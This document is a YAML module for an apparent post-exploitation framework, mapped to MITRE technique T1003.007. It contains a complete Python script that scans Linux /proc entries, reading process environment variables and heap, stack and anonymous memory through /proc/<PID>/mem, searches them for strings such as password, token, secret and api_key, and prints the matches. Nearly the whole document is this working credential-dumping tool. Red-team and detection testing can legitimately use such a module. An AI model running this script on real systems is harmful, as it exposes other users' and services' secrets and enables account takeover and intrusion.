name: proc_credential_dump
authors:
  - name: Anthony Rose
    handle: '@Cx01N'
    link: https://twitter.com/Cx01N_
description: |
  Extracts potential credentials from Linux process memory by reading
  /proc/<PID>/maps and /proc/<PID>/mem. Searches the heap, stack, and
  read-write anonymous memory regions for strings matching configurable
  patterns such as password, token, secret, and key.

  Can also read /proc/<PID>/environ to find environment variables
  that may contain secrets such as API keys, database passwords,
  and authentication tokens.

  Requires root privileges to read memory of processes owned by
  other users.
software: ''
tactics: [TA0006]
techniques: [T1003.007]
background: false
output_extension: ''
needs_admin: true
opsec_safe: false
language: python
min_language_version: '2.6'
comments:
  - https://github.com/redcanaryco/atomic-red-team
options:
  - name: TargetProcess
    description: >-
      Name of target process to search (e.g., sshd, apache2). If empty, searches
      all accessible processes.
    required: false
    value: ''
  - name: SearchStrings
    description: >-
      Comma-separated list of strings to search for in process memory.
    required: false
    value: 'password,passwd,token,secret,key,credential,api_key'
  - name: SearchEnviron
    description: >-
      Also search /proc/<PID>/environ for secrets in environment variables.
    required: false
    value: 'True'
    strict: true
    suggested_values:
      - 'True'
      - 'False'
  - name: MaxProcesses
    description: >-
      Maximum number of processes to scan (0 for unlimited).
    required: false
    value: '50'
script: |
  import os
  import re

  CHUNK_SIZE = 1024 * 1024  # 1 MB per read
  MAX_REGION_BYTES = 10 * 1024 * 1024  # hard cap per region
  MAX_FINDINGS_PER_PID = 20

  def proc_credential_dump():
      target_process = '{{ TargetProcess }}'.strip()
      search_strings = '{{ SearchStrings }}'.strip()
      search_environ = '{{ SearchEnviron }}'.strip()
      max_processes_raw = '{{ MaxProcesses }}'.strip() or '50'

      try:
          max_processes = int(max_processes_raw)
      except ValueError:
          print('[!] Invalid MaxProcesses value: %s (expected integer)' % max_processes_raw)
          return

      patterns = [s.strip().lower() for s in search_strings.split(',') if s.strip()]

      print('[*] Proc Filesystem Credential Dump')
      print('[*] Search patterns: %s' % ', '.join(patterns))

      if os.geteuid() != 0:
          print('[!] Warning: not running as root, access to other processes will be limited')

      pids = []
      for entry in os.listdir('/proc'):
          if entry.isdigit():
              pids.append(entry)

      # Scan highest PIDs first -- newer/userland processes are the
      # interesting ones (browsers, ssh-agent, keyrings).
      pids.sort(key=int, reverse=True)

      if target_process:
          filtered = []
          for pid in pids:
              try:
                  with open('/proc/%s/comm' % pid, 'r') as f:
                      comm = f.read().strip()
                  if target_process.lower() in comm.lower():
                      filtered.append(pid)
              except (IOError, OSError):
                  continue
          pids = filtered
          print('[*] Targeting process: %s (%d PIDs found)' % (target_process, len(pids)))
      else:
          print('[*] Scanning all accessible processes (%d total)' % len(pids))

      if max_processes > 0 and len(pids) > max_processes:
          pids = pids[:max_processes]
          print('[*] Limited to %d processes (highest PIDs first)' % max_processes)

      findings = []

      for pid in pids:
          try:
              with open('/proc/%s/comm' % pid, 'r') as f:
                  proc_name = f.read().strip()
          except (IOError, OSError):
              continue

          per_pid_count = 0

          # Search environ
          if search_environ.lower() == 'true':
              try:
                  with open('/proc/%s/environ' % pid, 'r') as f:
                      environ_data = f.read()
                  for var in environ_data.split('\x00'):
                      var_lower = var.lower()
                      for pattern in patterns:
                          if pattern in var_lower:
                              findings.append({
                                  'pid': pid,
                                  'process': proc_name,
                                  'source': 'environ',
                                  'data': var,
                              })
                              per_pid_count += 1
                              break
              except (IOError, OSError):
                  pass

          # Parse maps
          try:
              with open('/proc/%s/maps' % pid, 'r') as f:
                  maps_data = f.readlines()
          except (IOError, OSError):
              continue

          regions = []
          for line in maps_data:
              parts = line.split()
              if len(parts) < 2:
                  continue
              perms = parts[1]
              if 'r' not in perms:
                  continue
              addr_range = parts[0].split('-')
              if len(addr_range) != 2:
                  continue
              mapping = parts[5].strip() if len(parts) > 5 else ''
              # Heap/stack are always scanned if readable; anonymous regions
              # only if also writable (where credential material typically lives).
              if mapping in ('[heap]', '[stack]') or (mapping == '' and 'w' in perms):
                  try:
                      start = int(addr_range[0], 16)
                      end = int(addr_range[1], 16)
                      size = end - start
                      if 0 < size <= MAX_REGION_BYTES:
                          regions.append((start, size, mapping or 'anon'))
                  except ValueError:
                      continue

          if not regions:
              continue

          try:
              mem_fd = os.open('/proc/%s/mem' % pid, os.O_RDONLY)
          except (IOError, OSError):
              continue

          try:
              for start, size, region_name in regions:
                  if per_pid_count >= MAX_FINDINGS_PER_PID:
                      break
                  offset = 0
                  while offset < size and per_pid_count < MAX_FINDINGS_PER_PID:
                      try:
                          os.lseek(mem_fd, start + offset, os.SEEK_SET)
                          to_read = min(CHUNK_SIZE, size - offset)
                          data = os.read(mem_fd, to_read)
                      except (IOError, OSError):
                          break
                      if not data:
                          break
                      data_str = data.decode('utf-8', 'ignore').lower()
                      for pattern in patterns:
                          idx = 0
                          while per_pid_count < MAX_FINDINGS_PER_PID:
                              idx = data_str.find(pattern, idx)
                              if idx == -1:
                                  break
                              ctx_start = max(0, idx - 20)
                              ctx_end = min(len(data_str), idx + len(pattern) + 60)
                              context = data_str[ctx_start:ctx_end]
                              context = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', context).strip()
                              if len(context) > 5:
                                  findings.append({
                                      'pid': pid,
                                      'process': proc_name,
                                      'source': 'mem/%s' % region_name,
                                      'data': context[:200],
                                  })
                                  per_pid_count += 1
                              idx += len(pattern)
                      offset += to_read
          finally:
              try:
                  os.close(mem_fd)
              except OSError:
                  pass

      print('')
      if findings:
          print('[+] Found %d potential credential references:' % len(findings))
          print('-' * 80)
          seen = set()
          for f in findings:
              key = '%s:%s:%s' % (f['pid'], f['source'], f['data'][:50])
              if key in seen:
                  continue
              seen.add(key)
              print('PID: %s | Process: %s | Source: %s' % (f['pid'], f['process'], f['source']))
              print('  Data: %s' % f['data'])
              print('-' * 80)
      else:
          print('[*] No credential references found in scanned processes')

  proc_credential_dump()
